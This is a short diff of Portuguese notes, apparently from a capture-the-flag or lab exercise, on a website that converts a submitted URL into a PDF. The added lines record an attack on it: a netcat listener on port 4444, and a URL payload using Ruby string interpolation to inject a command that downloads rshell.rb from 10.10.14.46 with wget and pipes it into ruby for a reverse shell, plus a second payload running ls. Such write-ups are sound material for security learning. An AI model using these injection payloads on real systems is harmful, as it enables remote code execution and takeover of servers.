@@ -1,6 +1,10 @@
 A aplicação principal é um site que recebe uma URL e converte o site em PDF.
 
-
 Na pagina principal eu recebo uma tela para inserir uma url. O site acessa a pagina, baixa, converte em pdf e me retorna.
 
+criei um ouvinte com o netcat nc -lvp 4444
+inseri o texto abaixo
+http://10.10.14.46?name=#{'%20` wget  --quiet --output-document - http://10.10.14.46:80/rshell.rb | ruby`'}
+recebi um acesso ao shell pelo ruby
 
+http://10.10.14.46?name=#{'%20`ls`'}
